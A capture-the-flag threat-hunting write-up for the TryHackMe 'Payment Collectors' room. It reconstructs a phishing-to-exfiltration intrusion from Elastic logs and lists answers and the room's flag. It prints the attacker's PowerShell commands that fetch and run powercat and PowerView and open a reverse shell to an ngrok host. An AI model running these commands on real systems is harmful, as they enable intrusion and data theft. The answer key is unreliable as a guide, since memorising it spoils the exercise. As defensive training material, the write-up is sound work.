# TryHackMe: Hunt Me I: Payment Collectors Challenge Writeup


Challenge Link: https://tryhackme.com/room/paymentcollectors

## Secnario

On Friday, September 15, 2023, Michael Ascot, a Senior Finance Director from SwiftSpend, was checking his emails in Outlook and came across an email appearing to be from Abotech Waste Management regarding a monthly invoice for their services. Michael actioned this email and downloaded the attachment to his workstation without thinking.

The following week, Michael received another email from his contact at Abotech claiming they were recently hacked and to carefully review any attachments sent by their employees. However, the damage has already been done. Use the attached Elastic instance to hunt for malicious activity on Michael's workstation and within the SwiftSpend domain!

## Q&A

### Q1. What was the name of the ZIP attachment that Michael downloaded?

The "content.outlook" folder within your Windows user profile is **a hidden directory used by Outlook to store temporary files, primarily email attachments**. It acts as a cache for these files when you open or save attachments directly from Outlook. 

<img width="1658" height="745" alt="image" src="https://github.com/user-attachments/assets/379b608d-edbd-4c0c-a717-7edbdb3058a8" />

Time: Sep 15, 2023 @ 18:41:00

**Ans: Invoice_AT_2023-227.zip**

### Q2. What was the contained file that Michael extracted from the attachment?

<img width="1630" height="682" alt="image" src="https://github.com/user-attachments/assets/914fe42d-fca6-4ce8-abdf-a284889e4661" />

- Time: Sep 15, 2023 @ 18:41:11
- md5 hash: 402b79ca0d63da93be3488ad70a6644a

**Ans: Payment_Invoice.pdf.lnk.lnk**

### Q3. What was the name of the command-line process that spawned from the extracted file attachment?

based on the process id of the extracted file

<img width="1648" height="741" alt="image" src="https://github.com/user-attachments/assets/76eb802f-d36d-4d49-97c8-6c936fb63fb9" />

time: Sep 15, 2023 @ 18:41:12.923

**Ans: powershell.exe**

### Q4. What URL did the attacker use to download a tool to establish a reverse shell connection?

**Ans:** https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

### Q5. What port did the workstation connect to the attacker on?

```powershell
"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c [2.tcp.ngrok.io](http://2.tcp.ngrok.io/) -p 19282 -e powershell\""
```

The payload started a bind shell with port 19282 

- Time of the connection: Sep 15, 2023 @ 18:41:04.381
- Sorce ip: 172.16.1.150
- Source port: 61335
- Destionation ip: 3.22.53.161
- Destionation port: 19282

**Ans: 19282** 

### Q6. What was the first native Windows binary the attacker ran for system enumeration after obtaining remote access?

The attacker used all of these native Windows binaries for the enumeration process. 

<img width="1607" height="750" alt="image" src="https://github.com/user-attachments/assets/db263332-9609-4659-a0f3-53acebc65533" />

time: Sep 15, 2023 @ 18:41:28.487

<img width="1595" height="739" alt="image" src="https://github.com/user-attachments/assets/2fe93c6e-b966-493d-b650-56bd31c60600" />

time: Sep 15, 2023 @ 18:41:36.480

<img width="1626" height="771" alt="image" src="https://github.com/user-attachments/assets/e2aef47b-7f75-4f87-ad7e-ddeae5f2157f" />

time: Sep 15, 2023 @ 18:41:50.759

**Ans: systeminfo.exe**

### Q7. What is the URL of the script that the attacker downloads to enumerate the domain?

<img width="1701" height="741" alt="image" src="https://github.com/user-attachments/assets/6851d2ef-1d24-4301-8226-9b0af9b8f660" />

Time: Sep 15, 2023 @ 18:42:23.043

You can also find it if you search for the process id of systeminfo.exe  PPID

<img width="1638" height="736" alt="image" src="https://github.com/user-attachments/assets/ca63445d-16e8-4ab7-9eb1-86c41fbaff47" />

<img width="1692" height="765" alt="image" src="https://github.com/user-attachments/assets/b665a551-4731-43fb-a331-f42a431eab17" />

**Ans:** https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1 

### Q8. What was the name of the file share that the attacker mapped to Michael's workstation?

event.code: 1 (process creation)

<img width="1915" height="667" alt="image" src="https://github.com/user-attachments/assets/40750246-9292-48c9-8487-18166160672c" />

Time: Sep 15, 2023 @ 18:44:18.745

The attacker maps a network drive (**`Z:`**) to the shared folder **`\\FILESRV-01\SSF-FinancialRecords`** using **`net.exe`**

**Ans: SSF-FinancialRecords**

### Q9. What directory did the attacker copy the contents of the file share to?

Then he copied the content of the current directory (**`\\FILESRV-01\SSF-FinancialRecords`**) to the C:\Users\michael.ascot\downloads\exfiltration folder

<img width="1492" height="212" alt="image" src="https://github.com/user-attachments/assets/7aef89d7-b954-40cb-b015-2d0af5eb7260" />

Time: Sep 15, 2023 @ 18:45:05.319

**Ans: C:\Users\michael.ascot\downloads\exfiltration**

### Q10. What was the name of the Excel file the attacker extracted from the file share?

<img width="1741" height="619" alt="image" src="https://github.com/user-attachments/assets/19b3c00d-0c89-44e9-9d77-47920ef7419c" />

Time: Sep 15, 2023 @ 18:45:33.898

**Ans: ClientPortfolioSummary.xlsx**

### Q11. What was the name of the archive file that the attacker created to prepare for exfiltration?

<img width="1821" height="582" alt="image" src="https://github.com/user-attachments/assets/df429a7f-d3a7-4248-98bf-6727c88f0539" />

Time: Sep 15, 2023 @ 18:45:33.727

**Ans: exfilt8me.zip**

### Q12. What is the **MITRE ID** of the technique that the attacker used to exfiltrate the data?

<img width="1668" height="703" alt="image" src="https://github.com/user-attachments/assets/554385b1-14ff-4b60-870e-def12143a2d6" />

Time: Sep 15, 2023 @ 18:46:03.552

**Ans**: [T1048](https://attack.mitre.org/techniques/T1048/)

### Q13. What was the domain of the attacker's server that retrieved the exfiltrated data?

**Ans: haz4rdw4re.io**

### Q14. The attacker exfiltrated an additional file from the victim's workstation. What is the flag you receive after reconstructing the file?

<img width="1449" height="300" alt="image" src="https://github.com/user-attachments/assets/8df42f96-fb2e-4f6e-9d54-b9294b0461cc" />

<img width="1447" height="657" alt="image" src="https://github.com/user-attachments/assets/92b5980c-73e3-4515-a604-258ba47b8f9e" />

**Ans: THM{1497321f4f6f059a52dfb124fb16566e}**

## **Attack Timeline**

| **Time (Sep 15, 2023)** | **Action** | **Tool/Command Used** | **Evidence/Artifact** |
| --- | --- | --- | --- |
| **18:41:00** | Michael downloads a malicious ZIP attachment from Outlook. | **`Invoice_AT_2023-227.zip`** (via Outlook) | Found in **`content.outlook`** temp folder. |
| **18:41:11** | ZIP extracted → LNK file executed. | **`Payment_Invoice.pdf.lnk.lnk`** (malicious shortcut) | MDF hash: **`402b79ca0d63da93be3488ad70a6644a`**. |
| **18:41:12.923** | LNK file spawns **`powershell.exe`**. | Hidden PowerShell execution | Process ID tied to LNK file. |
| **18:41:04.381** | PowerShell downloads **`powercat.ps1`** for reverse shell. | **`IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1")`** | Connects to Ngrok (**`2.tcp.ngrok.io:19282`**). |
| **18:41:28.487** | Attacker runs **`systeminfo.exe`** for initial recon. | **`systeminfo.exe`** | First native binary executed post-access. |
| **18:42:23.043** | Downloads **`PowerView.ps1`** for domain enumeration. | **`IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1")`** | Used to enumerate AD. |
| **18:44:18.745** | Maps network drive to **`\\FILESRV-01\SSF-FinancialRecords`**. | **`net use Z: \\FILESRV-01\SSF-FinancialRecords`** | Drive **`Z:`** mapped to sensitive share. |
| **18:45:05.319** | Copies share contents to **`C:\Users\michael.ascot\downloads\exfiltration`**. | **`copy * C:\Users\michael.ascot\downloads\exfiltration`** | Exfiltrates **`ClientPortfolioSummary.xlsx`**. |
| **18:45:33.727** | Creates **`exfilt8me.zip`** for exfiltration prep. | **`Compress-Archive`** or manual ZIP creation | Archive contains stolen files. |
| **18:46:03.552** | Exfiltrates data via **Exfiltration Over Alternative Protocol (T1048)**. | Uploads to attacker’s server (**`haz4rdw4re.io`**) | Additional file exfiltrated: **`flag.txt`** (THM{1497321f4f6f059a52dfb124fb16566e}). |
